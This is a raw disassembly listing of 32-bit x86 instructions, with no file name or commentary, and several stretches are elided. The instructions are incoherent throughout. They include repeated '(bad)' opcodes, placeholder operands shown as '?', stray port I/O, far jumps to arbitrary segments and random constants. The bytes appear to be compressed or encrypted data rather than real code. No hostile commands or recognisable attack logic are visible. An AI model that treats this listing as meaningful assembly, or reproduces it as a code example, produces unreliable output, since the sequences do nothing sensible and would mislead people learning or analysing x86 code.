  4252b7:	imul   edi,DWORD PTR [edx+edi*1+0x20229d19],0x6b
  4252bf:	je     0x4252e4
  4252c1:	push   ebp
  4252c2:	xchg   esp,eax
  4252c3:	pusha  
  4252c4:	cmp    DWORD PTR [eax-0x32],esp
  4252c7:	adc    al,BYTE PTR [eax+ebx*4+0x1b774d60]
  4252ce:	in     al,0x9d
  4252d0:	movups xmm0,XMMWORD PTR [esi-0x19]
  4252d4:	test   eax,0x52654794
  4252d9:	lahf   
  4252da:	data16 and al,0xf0
  4252dd:	repz sub eax,0xd62ff2da
  4252e3:	lds    ebx,FWORD PTR [edi-0x1b2e2d1c]
  4252e9:	lahf   
  4252ea:	cmp    dl,bh
  4252ec:	xor    BYTE PTR [esi-0x2730210],ah
  4252f2:	or     dh,dl
  4252f4:	ins    DWORD PTR es:[edi],dx
  4252f5:	psubd  mm2,QWORD PTR [edi-0x13f827ca]
  4252fc:	and    ebp,ebx
  4252fe:	xor    eax,0xa5a753cd
  425303:	xchg   esi,eax
  425304:	adc    bl,BYTE PTR [eax-0x1f]
  425307:	xor    al,BYTE PTR [edi+0x1b37380e]
  42530d:	(bad)  
  42530f:	inc    ecx
  425310:	mov    cl,0x45
  425312:	sub    al,0x5f
  425314:	xlat   BYTE PTR ds:[ebx]
  425315:	mov    ?,WORD PTR [edx-0xf]
  425318:	lods   eax,DWORD PTR ds:[esi]
  425319:	aas    
  42531a:	pop    ebx
  42531b:	mov    edx,0xebc11054
  425320:	xor    BYTE PTR [eax],0xba
  425323:	jo     0x4252c9
  425325:	repnz push edx
  425327:	arpl   WORD PTR [edx+0x2e],sp
  42532a:	inc    edx
  42532b:	jbe    0x425308
  42532d:	mov    al,ds:0xb7372513
  425332:	xchg   esp,eax
  425333:	stos   DWORD PTR es:[edi],eax
  425334:	xor    edi,DWORD PTR [ebx+0x6a184ec1]
  42533a:	dec    edx
  42533b:	push   edi
  42533c:	dec    esp
  42533d:	adc    BYTE PTR [esi-0x64],cl
  425340:	add    al,0x58
  425342:	ret    
  425343:	inc    ecx
  425344:	pop    ds
  425345:	je     0x4253ab
  425347:	inc    esi
  425348:	pop    ds
  425349:	clc    
  42534a:	pop    ecx
  42534b:	cmp    BYTE PTR [ebp+0x35],bl
  42534e:	jb     0x7aaac2fa
  425354:	sbb    al,0xb1
  425356:	into   
  425357:	cld    
  425358:	inc    edx
  425359:	push   ds
  42535a:	inc    ebp
  42535b:	cli    
  42535c:	ins    DWORD PTR es:[edi],dx
  42535d:	and    DWORD PTR [eax],esp
  42535f:	jae    0x42535b
  425361:	dec    ebx
  425362:	pop    esp
  425363:	mov    dh,0x81
  425365:	or     DWORD PTR [esi-0x6d],eax
  425368:	pop    eax
  425369:	sar    BYTE PTR [eax-0x64e473f9],cl
  42536f:	mov    WORD PTR ds:0x69f13d43,ss
  425375:	test   al,0x1c
  425377:	sub    esp,eax
  425379:	fcmovne st,st(5)
  42537b:	imul   edi,DWORD PTR [edx+ebx*1-0x30676044],0x77e3b26
  425386:	adc    BYTE PTR [ecx-0x55],bh
  425389:	int    0x8a
  42538b:	pusha  
  42538c:	push   ss
  42538d:	call   0x44736a3b
  425392:	test   eax,0x527f0e9c
  425397:	fs jb  0x425403
  42539a:	lock sbb DWORD PTR [ecx+edi*1+0x2f2318bc],eax
  4253a2:	adc    bh,BYTE PTR [ecx-0x51c60d51]
  4253a8:	in     al,0x8b
  4253aa:	jge    0x5457c3b3
  4253b0:	lds    edi,FWORD PTR [edi-0x70]
  4253b3:	call   0x0:0x58
	...
  425416:	inc    edx
  425417:	or     esp,eax
  425419:	test   eax,0xeb6fedcf
  42541e:	out    0xf4,eax
  425420:	xchg   al,bl
  425422:	fistp  DWORD PTR [edx]
  425424:	add    DWORD PTR [eax],ecx
  425426:	cld    
  425427:	mov    WORD PTR [ecx],es
  425429:	add    BYTE PTR [edi],al
  42542b:	add    DWORD PTR [eax],eax
  42542d:	add    BYTE PTR [edx+0x2661dc90],bh
  425433:	xor    ebx,ebx
  425435:	ins    DWORD PTR es:[edi],dx
  425436:	jl     0x425498
  425438:	scas   eax,DWORD PTR es:[edi]
  425439:	ins    BYTE PTR es:[edi],dx
  42543a:	fisttp QWORD PTR [eiz*1+0x74e6c45f]
  425441:	mov    bh,0x85
  425443:	aaa    
  425444:	and    BYTE PTR [ebx],dl
  425446:	ret    
  425447:	mov    dl,0xbc
  425449:	in     al,0x17
  42544b:	out    0x6c,al
  42544d:	addr16 pop esp
  42544f:	push   ss
  425450:	ret    0xd2bc
  425453:	sbb    bl,BYTE PTR [eax+edx*2-0xd]
  425457:	dec    ecx
  425458:	mov    ds:0xbe774533,eax
  42545d:	and    DWORD PTR [edi],esp
  42545f:	cdq    
  425460:	push   ss
  425461:	rol    edx,cl
  425463:	cmp    esi,edx
  425465:	stos   DWORD PTR es:[edi],eax
  425466:	xor    BYTE PTR [ecx+0x76c9c5e7],bl
  42546c:	dec    ecx
  42546d:	arpl   WORD PTR [ebp-0x16095bd3],dx
  425473:	xchg   esp,eax
  425474:	inc    edi
  425475:	push   cs
  425476:	dec    esp
  425477:	sub    edx,DWORD PTR ds:0x544b0057
  42547d:	mov    edi,0x5ea5e1e
  425482:	fadd   DWORD PTR [ebx+0x14]
  425485:	mov    edx,0xbd2e4833
  42548a:	mov    ?,WORD PTR [ecx]
  42548c:	mov    eax,ds:0x7b86c996
  425491:	pusha  
  425492:	mov    al,ds:0x9b41cad2
  425497:	hlt    
  425498:	or     DWORD PTR [ebx+0x2502334d],ebp
  42549e:	xchg   esp,eax
  42549f:	fbstp  TBYTE PTR [ebx+0x3fa0da09]
  4254a5:	out    dx,al
  4254a6:	mov    dh,0x21
  4254a8:	sub    bl,BYTE PTR [edi+0x30]
  4254ab:	xor    BYTE PTR [ecx-0x27],bh
  4254ae:	jp     0x425510
  4254b0:	mov    ds:0x5cdc614,al
  4254b5:	mov    ds,WORD PTR ds:0x5b632c86
  4254bb:	mov    bh,0xd
  4254bd:	adc    eax,DWORD PTR [edx]
  4254bf:	sub    edx,DWORD PTR ds:[esp+esi*8-0x68]
  4254c4:	sub    ecx,DWORD PTR [edi-0xadf9261]
  4254ca:	ss jecxz 0x4254ac
  4254cd:	pop    edx
  4254ce:	jmp    0x42552c
  4254d0:	mov    dl,0x25
  4254d2:	call   0xb72e:0x874aa3c7
  4254d9:	push   ebp
  4254da:	mov    ecx,edi
  4254dc:	jle    0x4254bf
  4254de:	xchg   ebp,eax
  4254df:	push   eax
  4254e0:	cwde   
  4254e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4254e2:	push   cs
  4254e3:	push   ebx
  4254e4:	adc    ebp,DWORD PTR [ebx-0x38cbabbe]
  4254ea:	nop
  4254eb:	pop    eax
  4254ec:	sbb    eax,0xf43cc23f
  4254f1:	xor    eax,0x2eaaf3f3
  4254f6:	pop    ss
  4254f7:	mov    ebx,0x60bf973
  4254fc:	outs   dx,BYTE PTR ds:[esi]
  4254fd:	jne    0x425523
  4254ff:	mov    bh,BYTE PTR [ecx+0x6e5c75d9]
  425505:	xchg   ecx,eax
  425506:	xor    BYTE PTR ds:0x9f0aa2e5,0x15
  42550d:	push   esp
  42550e:	js     0x425492
  425510:	mul    DWORD PTR [esi]
  425512:	loopne 0x4254a8
  425514:	push   ecx
  425515:	in     al,0x7b
  425517:	sbb    eax,0x599bc77d
  42551c:	adc    DWORD PTR [edx],edi
  42551e:	mov    dh,0x4f
  425520:	xchg   edx,eax
  425521:	mov    bl,0x3c
  425523:	in     al,dx
  425524:	mov    ch,0x70
  425526:	jg     0x425500
  425528:	imul   esi,DWORD PTR ds:0x13f07b02,0xffffffec
  42552f:	and    eax,esp
  425531:	dec    ebx
  425532:	gs das 
  425534:	cmp    BYTE PTR [eax],al
	...
  425596:	(bad)  
  425597:	jmp    0xfef4:0xfe6e7a4e
  42559e:	dec    esp
  42559f:	push   ecx
  4255a0:	ret    0x60c6
  4255a3:	adc    DWORD PTR [ebp+0x5c],edx
  4255a6:	add    ecx,DWORD PTR [esi+0x1070001]
  4255ac:	add    BYTE PTR [eax],al
  4255ae:	jne    0x425568
  4255b0:	inc    esp
  4255b1:	iret   
  4255b2:	cmc    
  4255b3:	sub    DWORD PTR [ecx],esi
  4255b5:	push   0x19
  4255b7:	xchg   al,al
  4255b9:	shl    DWORD PTR [esi-0x4df850],0x3d
  4255c0:	into   
  4255c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4255c2:	xchg   ecx,eax
  4255c3:	sub    DWORD PTR [eax],ebp
  4255c5:	fidivr DWORD PTR [esi-0x72]
  4255c8:	popa   
  4255c9:	jle    0x42560c
  4255cb:	inc    DWORD PTR [ebx]
  4255cd:	or     DWORD PTR [ecx],0xffffffde
  4255d0:	pop    edi
  4255d1:	mov    ds:0x2285e432,al
  4255d6:	sbb    DWORD PTR [ecx-0x7adbe183],edi
  4255dc:	jmp    0x425604
  4255de:	rcl    DWORD PTR [eax],1
  4255e0:	ins    DWORD PTR es:[edi],dx
  4255e1:	fidiv  WORD PTR [edx+0x4f]
  4255e4:	xor    eax,0x4a39281e
  4255e9:	sbb    al,0x1b
  4255eb:	add    BYTE PTR [edi-0x548dfe40],bl
  4255f1:	pop    eax
  4255f2:	aas    
  4255f3:	and    DWORD PTR [ebx+edx*4+0x6c87e05],edi
  4255fa:	push   edi
  4255fb:	jo     0x42567b
  4255fd:	popa   
  4255fe:	lea    eax,[ecx+0x2fb9d303]
  425604:	jmp    0x42561b
  425606:	fist   WORD PTR [edx-0x20]
  425609:	test   al,0x4e
  42560b:	pop    esp
  42560c:	dec    esi
  42560d:	mov    dl,0x5
  42560f:	jb     0x42563b
  425611:	sub    BYTE PTR [edx+0x5179fda2],0x25
  425618:	xor    bh,bh
  42561a:	clc    
  42561b:	sar    BYTE PTR [edi+0x76],0xc1
  42561f:	stc    
  425620:	mul    DWORD PTR [edx+0x11]
  425623:	add    bl,BYTE PTR [eax+0x208b42d3]
  425629:	rcl    bh,1
  42562b:	(bad)  
  42562c:	retf   
  42562d:	mov    ch,0xaf
  42562f:	cdq    
  425630:	cmc    
  425631:	jo     0x425671
  425633:	(bad)  
  425634:	loopne 0x425643
  425636:	xchg   ebx,eax
  425637:	jmp    0x425678
  425639:	iret   
  42563a:	test   DWORD PTR [ecx+0x2c],edx
  42563d:	mov    esi,0x9032cd48
  425642:	jb     0x42560b
  425644:	fwait
  425645:	ins    DWORD PTR es:[edi],dx
  425646:	mov    al,0x79
  425648:	les    esi,FWORD PTR ds:0x60599d41
  42564e:	xor    DWORD PTR [edi],edx
  425650:	jmp    0xdc39:0xad108c0b
  425657:	inc    eax
  425658:	jnp    0x425622
  42565a:	rcr    BYTE PTR [esi+ebp*8],1
  42565d:	mov    DWORD PTR ds:0x248f9ef0,esi
  425663:	push   ebx
  425664:	xor    al,0x27
  425666:	fistp  QWORD PTR [esi+0x5b]
  425669:	ins    DWORD PTR es:[edi],dx
  42566a:	call   0x675ffb45
  42566f:	loopne 0x425600
  425671:	mov    DWORD PTR [ecx+0x60],esi
  425674:	dec    esi
  425675:	hlt    
  425676:	mov    ebx,0xfaf7c824
  42567c:	int3   
  42567d:	mov    dl,0x9c
  42567f:	adc    BYTE PTR [edi+0x28],0x7b
  425683:	ret    
  425684:	push   ss
  425685:	out    dx,al
  425686:	scas   eax,DWORD PTR es:[edi]
  425687:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425688:	mov    ebp,0x1775add
  42568d:	xchg   ebp,eax
  42568e:	lds    ebx,FWORD PTR [ecx]
  425690:	cmp    ch,cl
  425692:	push   edx
  425693:	push   esi
  425694:	in     eax,0x7b
  425696:	neg    BYTE PTR [esi+ebp*2+0x48]
  42569a:	pop    edx
  42569b:	jo     0x425682
  42569d:	push   ds
  42569e:	push   esp
  42569f:	adc    bh,ch
  4256a1:	inc    ebx
  4256a2:	popa   
  4256a3:	push   esi
  4256a4:	mov    dl,dl
  4256a6:	push   cs
  4256a7:	(bad)  
  4256a8:	xor    al,0x10
  4256aa:	test   ah,bl
  4256ac:	pop    eax
  4256ad:	sub    al,BYTE PTR [edi+0xe]
  4256b0:	daa    
  4256b1:	adc    eax,0x169da9
	...
  425716:	(bad)  
  425717:	aaa    
  425718:	shl    BYTE PTR [ebx+esi*8],cl
  42571b:	cmc    
  42571c:	div    bh
  42571e:	mov    dl,0x28
  425720:	shr    DWORD PTR [ebx-0x3f824652],cl
  425726:	or     cl,BYTE PTR [edi+0x1070001]
  42572c:	add    BYTE PTR [eax],al
  42572e:	xor    eax,0x10c338d
  425733:	lock and al,0x7d
  425736:	in     eax,0x1c
  425738:	mov    bh,0xb5
  42573a:	ret    0xf4e1
  42573d:	fiadd  WORD PTR [esp+esi*1-0x3c0cf470]
  425744:	add    al,0xd2
  425746:	and    BYTE PTR [ecx+0x43],ch
  425749:	in     al,0x72
  42574b:	fild   QWORD PTR [esi+0x5]
  42574e:	pusha  
  42574f:	xchg   ebx,eax
  425750:	jns    0x4257b3
  425752:	adc    bl,BYTE PTR [edi+0x2b]
  425755:	jmp    0x42574c
  425757:	loopne 0x42578c
  425759:	add    ah,BYTE PTR [ebx+eax*4]
  42575c:	scas   al,BYTE PTR es:[edi]
  42575d:	fwait
  42575e:	popf   
  42575f:	xchg   ebp,eax
  425760:	addr16 inc eax
  425762:	dec    edi
  425763:	not    edi
  425765:	mov    ds:0xd1b5c828,al
  42576a:	jbe    0x425751
  42576c:	dec    eax
  42576d:	outs   dx,DWORD PTR ds:[esi]
  42576e:	xchg   BYTE PTR [eax-0x40],dl
  425771:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425772:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425773:	inc    ebx
  425774:	int3   
  425775:	add    BYTE PTR fs:[eax+0x50487e8c],bh
  42577c:	in     eax,0x64
  42577e:	pop    edx
  42577f:	retw   0x35c5
  425783:	dec    ecx
  425784:	sub    eax,0x12e62192
  425789:	xchg   edi,eax
  42578a:	and    al,0x80
  42578c:	mov    esi,0x7de3ec82
  425791:	loope  0x4257a8
  425793:	pop    es
  425794:	ret    
  425795:	pop    es
  425796:	lods   al,BYTE PTR ds:[esi]
  425797:	stos   DWORD PTR es:[edi],eax
  425798:	mov    ds:0x364fb367,eax
  42579d:	dec    esi
  42579e:	addr16 xor eax,0xd11817f5
  4257a4:	sbb    eax,0x6a8e0ec7
  4257a9:	xor    al,0xb0
  4257ab:	pop    edi
  4257ac:	xchg   esp,eax
  4257ad:	fdivr  QWORD PTR [ebx]
  4257af:	xchg   ecx,eax
  4257b0:	xor    eax,0xebddec8b
  4257b5:	fcmovnb st,st(5)
  4257b7:	fbstp  TBYTE PTR [edx]
  4257b9:	or     BYTE PTR [esi-0x50],bh
  4257bc:	push   ebp
  4257bd:	fisttp DWORD PTR [ebx-0x4d]
  4257c0:	dec    BYTE PTR [edi+0x57]
  4257c3:	jae    0x4257f9
  4257c5:	cli    
  4257c6:	stos   BYTE PTR es:[edi],al
  4257c7:	inc    esp
  4257c8:	lea    ebp,[esi+0x38]
  4257cb:	mov    WORD PTR [esi+edi*8],fs
  4257ce:	xchg   esi,eax
  4257cf:	cmp    cl,BYTE PTR [edi+0x2d]
  4257d2:	(bad)  [edi]
  4257d4:	inc    esi
  4257d5:	lahf   
  4257d6:	les    eax,FWORD PTR [esi+0x2185ec2e]
  4257dc:	mov    ebx,0x903598f2
  4257e1:	loope  0x425833
  4257e3:	adc    al,0x6
  4257e5:	ins    DWORD PTR es:[edi],dx
  4257e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4257e7:	into   
  4257e8:	pop    esp
  4257e9:	cmp    dh,dl
  4257eb:	sbb    BYTE PTR [ebx],0xae
  4257ee:	pop    edx
  4257ef:	mov    al,ds:0xbf167647
  4257f4:	cld    
  4257f5:	(bad)  
  4257f6:	cmp    edx,DWORD PTR [edi-0x7a0fb7be]
  4257fc:	out    dx,eax
  4257fd:	imul   ebx,ebx,0x5625a8b6
  425803:	xor    DWORD PTR [eax-0x35],eax
  425806:	jns    0x4257ed
  425808:	ret    0x91ac
  42580b:	mov    esp,0x5f72f7f1
  425810:	push   edx
  425811:	pop    edi
  425812:	repnz push esi
  425814:	into   
  425815:	sub    eax,0x7f37dd07
  42581a:	add    ch,bl
  42581c:	(bad)  
  42581d:	add    al,0x2d
  42581f:	inc    esp
  425820:	mov    ah,0x85
  425822:	(bad)
  425825:	(bad)  
  425826:	adc    edi,DWORD PTR [edi-0x801e64]
  42582c:	outs   dx,BYTE PTR ds:[esi]
  42582d:	add    DWORD PTR [ecx-0x25e001a6],0xffffffa3
  425834:	in     al,0x0
	...
  425896:	pop    esp
  425897:	push   edx
  425898:	nop
  425899:	push   edx
  42589a:	sahf   
  42589b:	rcr    dh,cl
  42589d:	pop    esi
  42589e:	inc    eax
  42589f:	scas   eax,DWORD PTR es:[edi]
  4258a0:	stc    
  4258a1:	mov    ds:0x1425385f,al
  4258a6:	adc    DWORD PTR [eax+0x1070001],edx
  4258ac:	add    BYTE PTR [eax],al
  4258ae:	loopne 0x42585a
  4258b0:	mov    ebx,0xd7586dcd
  4258b5:	test   BYTE PTR [ecx],dl
  4258b7:	add    BYTE PTR [edi+0x375b71b9],0x1d
  4258be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4258bf:	leave  
  4258c0:	and    al,0x7
  4258c2:	xchg   ebx,eax
  4258c3:	in     eax,0x1e
  4258c5:	jbe    0x4258a6
  4258c7:	jmp    DWORD PTR [ebx+0x26]
  4258ca:	popa   
  4258cb:	jecxz  0x4258af
  4258cd:	nop
  4258ce:	sub    al,cl
  4258d0:	rol    ah,1
  4258d2:	loop   0x425886
  4258d4:	(bad)  
  4258d5:	adc    BYTE PTR [eax-0x1050d205],ah
  4258db:	mov    BYTE PTR [ebx+0x54779929],dl
  4258e1:	and    cl,cl
  4258e3:	cld    
  4258e4:	mov    esi,0x9062f9ab
  4258e9:	popf   
  4258ea:	cmp    eax,0x6293a1da
  4258ef:	stc    
  4258f0:	add    ah,dh
  4258f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4258f3:	cmp    al,0xe2
  4258f5:	xchg   edi,eax
  4258f6:	mov    dl,0xad
  4258f8:	lods   al,BYTE PTR ds:[esi]
  4258f9:	test   BYTE PTR [ebx-0x10550a53],bl
  4258ff:	xchg   ebp,eax
  425900:	pop    esp
  425901:	jl     0x4258be
  425903:	push   ecx
  425904:	jg     0x4258eb
  425906:	popf   
  425907:	jecxz  0x425969
  425909:	int    0x1
  42590b:	ja     0x4258f5
  42590d:	adc    eax,0x5ed3d1d3
  425912:	inc    edi
  425913:	dec    edi
  425914:	adc    eax,0xc2156699
  425919:	lods   al,BYTE PTR ds:[esi]
  42591a:	int    0x63
  42591c:	mov    al,0xd4
  42591e:	outs   dx,DWORD PTR ds:[esi]
  42591f:	cmc    
  425920:	jmp    edx
  425922:	in     al,dx
  425923:	sbb    eax,esp
  425925:	add    BYTE PTR [edx+ebp*1+0x67],ah
  425929:	mov    edx,0x54319f1f
  42592e:	xchg   edi,eax
  42592f:	push   ecx
  425930:	repz imul esp,esp,0xffffffe0
  425934:	dec    esp
  425935:	ds adc eax,0x88518aa8
  42593b:	mov    eax,?
  42593d:	fs sti 
  42593f:	push   edi
  425940:	sub    DWORD PTR [edi+eax*8-0x65822119],ebx
  425947:	pusha  
  425948:	mov    edi,0x40ec946
  42594d:	jno    0x4259ce
  42594f:	inc    edx
  425950:	imul   ebx,DWORD PTR [ebp+0x75aeebd4],0x6f
  425957:	rol    DWORD PTR [edx-0x61],1
  42595a:	add    al,0x73
  42595c:	inc    ecx
  42595d:	adc    esp,0x22d90870
  425963:	sbb    BYTE PTR [ebp-0x1],bh
  425966:	out    dx,al
  425967:	fbstp  TBYTE PTR [ebx+0x6d]
  42596a:	xor    DWORD PTR [eax+0x2a2003a0],ebp
  425970:	inc    ecx
  425971:	retf   0x99d
  425974:	pushf  
  425975:	pop    edx
  425976:	xchg   ecx,eax
  425977:	call   0x84c8:0x3ca55794
  42597e:	in     al,dx
  42597f:	sub    eax,0x2988f2e7
  425984:	mov    ecx,0x7e5365c8
  425989:	sub    ch,BYTE PTR [ebp-0x161a823f]
  42598f:	repnz mov al,0xdc
  425992:	bound  ebx,QWORD PTR [eax+0x7d]
  425995:	inc    ebx
  425996:	rol    bl,1
  425998:	xchg   ebp,eax
  425999:	or     eax,0x281d936f
  42599e:	cmp    al,0xb2
  4259a0:	inc    edx
  4259a1:	fstp   TBYTE PTR [esi+0x410c6be9]
  4259a7:	add    DWORD PTR [ecx],0xc47333d3
  4259ad:	and    DWORD PTR [esi],edi
  4259af:	shl    DWORD PTR [esi],0xb8
  4259b2:	(bad)  
  4259b3:	dec    ecx
  4259b4:	cmp    BYTE PTR [eax],al
	...
  425a16:	shl    DWORD PTR [ebx+0x4],0x67
  425a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a1b:	jcxz   0x425a05
  425a1e:	mov    edi,0x85a6fe11
  425a24:	sbb    BYTE PTR [edx+0x19118],bh
  425a2a:	pop    es
  425a2b:	add    DWORD PTR [eax],eax
  425a2d:	add    BYTE PTR [ebx],ch
  425a2f:	sub    eax,0x6923584f
  425a34:	jns    0x4259db
  425a36:	sbb    eax,0xcfa8dd34
  425a3b:	dec    eax
  425a3c:	(bad)  
  425a3d:	mov    esp,0x33f85342
  425a42:	mov    cl,0xc0
  425a44:	stos   DWORD PTR es:[edi],eax
  425a45:	(bad)  
  425a46:	fxch   st(4)
  425a48:	inc    ebx
  425a49:	das    
  425a4a:	cld    
  425a4b:	sahf   
  425a4c:	jmp    0x8c3ffab7
  425a51:	jne    0x425a42
  425a53:	cmc    
  425a54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425a55:	cmp    eax,0x2d4c081a
  425a5a:	push   edx
  425a5b:	das    
  425a5c:	xor    eax,0xa6cbbc41
  425a61:	or     ecx,ebp
  425a63:	mov    ecx,0x44c0f515
  425a68:	add    eax,DWORD PTR [edi+edx*1+0xa]
  425a6c:	xor    BYTE PTR [eax],bl
  425a6e:	imul   eax,DWORD PTR ds:0x77bf83b5,0xfffffff1
  425a75:	xlat   BYTE PTR ds:[ebx]
  425a76:	or     DWORD PTR [ebx-0x16],edi
  425a79:	and    eax,0xc9d1f96c
  425a7e:	push   ebx
  425a7f:	fst    QWORD PTR [ecx+0x53]
  425a82:	pop    edx
  425a83:	adc    dl,al
  425a85:	inc    eax
  425a86:	jae    0x425b03
  425a88:	sbb    esp,DWORD PTR [ecx+ebp*1+0x44546969]
  425a8f:	pop    edi
  425a90:	cdq    
  425a91:	xor    ebp,ecx
  425a93:	neg    ebp
  425a95:	bound  edx,QWORD PTR [edx+0x7]
  425a98:	jbe    0x425ae0
  425a9a:	push   ebx
  425a9b:	ficom  DWORD PTR [esi]
  425a9d:	dec    esi
  425a9e:	cdq    
  425a9f:	pop    edx
  425aa0:	in     al,0xdc
  425aa2:	cmp    eax,0x662d04d1
  425aa7:	in     eax,0xb7
  425aa9:	inc    edx
  425aaa:	jmp    0xa50e:0x5edab510
  425ab1:	inc    edx
  425ab2:	push   ds
  425ab3:	jb     0x425b12
  425ab5:	ins    DWORD PTR es:[edi],dx
  425ab6:	and    al,0xe4
  425ab8:	mov    ebp,0x9201a851
  425abd:	sbb    DWORD PTR [edi-0x36],ecx
  425ac0:	sbb    BYTE PTR [ebp-0x3590a7c9],cl
  425ac6:	fcom   QWORD PTR [ebp-0x755ad49]
  425acc:	jmp    0x425aa7
  425ace:	jnp    0x425af5
  425ad0:	mov    esi,0xa03cb0e8
  425ad5:	add    ecx,DWORD PTR [ebp-0x6f3fd548]
  425adb:	push   esi
  425adc:	push   ebx
  425add:	mov    ebp,0x772d0af5
  425ae2:	int    0x3c
  425ae4:	jns    0x425b24
  425ae6:	(bad)  
  425ae7:	arpl   WORD PTR [ebp-0x33],dx
  425aea:	jp     0x425b37
  425aec:	and    ch,BYTE PTR fs:[ecx]
  425aef:	dec    esp
  425af0:	mov    dh,0xe9
  425af2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425af3:	repnz repz in eax,dx
  425af6:	mov    ds:0x9ecbb8cd,al
  425afb:	adc    BYTE PTR [edx],ah
  425afd:	and    ch,0x8d
  425b00:	jecxz  0x425b3d
  425b02:	shl    dl,0x31
  425b05:	push   sp
  425b07:	outs   dx,BYTE PTR ds:[esi]
  425b08:	stos   BYTE PTR es:[edi],al
  425b09:	mov    ebx,0x537bd0c0
  425b0e:	pop    es
  425b0f:	adc    ah,cl
  425b11:	cmp    eax,0x383d1454
  425b16:	in     eax,dx
  425b17:	sub    ebx,eax
  425b19:	cwde   
  425b1a:	imul   ecx,DWORD PTR [ebp+0x66],0xffffffc1
  425b1e:	and    edi,DWORD PTR [esi+0x301ff04b]
  425b24:	pop    ecx
  425b25:	pushf  
  425b26:	mov    BYTE PTR [ebx+0x2388dda9],cl
  425b2c:	xchg   ebp,eax
  425b2d:	ret    0x3898
  425b30:	jne    0x425ba2
  425b32:	pop    ebp
  425b33:	and    al,0x2e
	...
  425b95:	add    ah,al
  425b97:	clc    
  425b98:	jnp    0x425bf0
  425b9a:	jg     0x425b73
  425b9c:	in     eax,dx
  425b9d:	cli    
  425b9e:	push   0x53a5aad3
  425ba3:	push   edx
  425ba4:	mov    BYTE PTR [ecx+0x1f],ah
  425ba7:	xchg   edx,eax
  425ba8:	add    DWORD PTR [eax],eax
  425baa:	pop    es
  425bab:	add    DWORD PTR [eax],eax
  425bad:	add    BYTE PTR [eax+0x8],ch
  425bb0:	outs   dx,DWORD PTR ds:[esi]
  425bb1:	mov    ah,0x8d
  425bb3:	pop    ebx
  425bb4:	jmp    0x44ce:0xc26d1e32
  425bbb:	scas   al,BYTE PTR es:[edi]
  425bbc:	inc    edi
  425bbd:	or     eax,0xbcc6481c
  425bc2:	add    DWORD PTR [ebx],ecx
  425bc4:	loop   0x425bfe
  425bc6:	mov    dl,0xbb
  425bc8:	adc    dl,BYTE PTR [edi-0x60]
  425bcb:	dec    ebp
  425bcc:	xor    BYTE PTR [edi-0x59e057a9],al
  425bd2:	jg     0x425bc4
  425bd4:	dec    ebp
  425bd5:	jae    0x425c0e
  425bd7:	xor    ah,BYTE PTR ss:[ebx]
  425bda:	ins    DWORD PTR es:[edi],dx
  425bdb:	xor    al,0xb7
  425bdd:	sahf   
  425bde:	into   
  425bdf:	mov    ebp,0xc1dac556
  425be4:	push   ebp
  425be5:	sbb    al,0x4f
  425be7:	xor    BYTE PTR [edx-0x7f],cl
  425bea:	mov    ebp,0xad48e1fe
  425bef:	mov    esp,0xf502e414
  425bf4:	loopne 0x425c02
  425bf6:	shl    BYTE PTR [edx-0x353aca8c],cl
  425bfc:	dec    ebp
  425bfd:	fistp  WORD PTR [edx]
  425bff:	in     eax,0xc2
  425c01:	stos   BYTE PTR es:[edi],al
  425c02:	jne    0x425bca
  425c04:	pop    esp
  425c05:	add    eax,edi
  425c07:	add    BYTE PTR [edi-0xf726d51],dh
  425c0d:	cmp    DWORD PTR [eax+0x29ecb538],0xb866d9be
  425c17:	adc    dh,cl
  425c19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c1a:	xchg   BYTE PTR [esi+0x7bf17e66],ch
  425c20:	sub    DWORD PTR [ebp-0x29],eax
  425c23:	sub    DWORD PTR [ebx+ebx*2-0x4310645],0xffffff9c
  425c2b:	mov    eax,ds:0x7efd1435
  425c31:	adc    BYTE PTR [ecx-0x52395bb5],bl
  425c37:	imul   eax,DWORD PTR [ebx-0x52001727],0xffffffb1
  425c3e:	sbb    eax,0x3d22a66c
  425c43:	mov    ds:0x86c6694d,al
  425c48:	sahf   
  425c49:	xchg   esi,eax
  425c4a:	hlt    
  425c4b:	in     eax,dx
  425c4c:	(bad)  
  425c4d:	pop    ss
  425c4e:	repnz and eax,0xec7d33ff
  425c54:	add    esi,ecx
  425c56:	in     eax,dx
  425c57:	dec    ebp
  425c58:	sbb    al,0x87
  425c5a:	xchg   esp,eax
  425c5b:	fnstcw WORD PTR [edi-0x6d197b8c]
  425c61:	rcl    DWORD PTR [ebp+esi*2-0x1a],0x91
  425c66:	aas    
  425c67:	mov    edx,0x637a2a64
  425c6c:	mov    ds:0xe09d23cb,al
  425c71:	mov    al,ds:0x90220417
  425c76:	jg     0x425c68
  425c78:	jl     0x425c1c
  425c7a:	out    dx,al
  425c7b:	jae    0x425c9c
  425c7d:	fild   WORD PTR [edi-0x76a73b1a]
  425c83:	fisub  DWORD PTR [edx-0x37]
  425c86:	retf   
  425c87:	sbb    ecx,edx
  425c89:	and    BYTE PTR [edi-0x538676d4],cl
  425c8f:	dec    ebx
  425c90:	adc    dl,bl
  425c92:	scas   eax,DWORD PTR es:[edi]
  425c93:	jle    0x425c75
  425c95:	mov    eax,ds:0x6803df7d
  425c9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425c9b:	stos   DWORD PTR es:[edi],eax
  425c9c:	xor    ah,0x7b
  425c9f:	addr16 mov esp,0x9943fb86
  425ca5:	dec    edx
  425ca6:	or     al,0x83
  425ca8:	pop    es
  425ca9:	cli    
  425caa:	cli    
  425cab:	inc    eax
  425cac:	xchg   ecx,eax
  425cad:	mov    edx,DWORD PTR [eax+0x79]
  425cb0:	push   0xffffff9a
  425cb2:	fdivr  st,st(2)
  425cb4:	dec    edx
	...
  425d15:	add    bh,bh
  425d17:	lods   al,BYTE PTR ds:[esi]
  425d18:	fadd   QWORD PTR [edi]
  425d1a:	fbstp  TBYTE PTR [edi-0x1]
  425d1d:	cld    
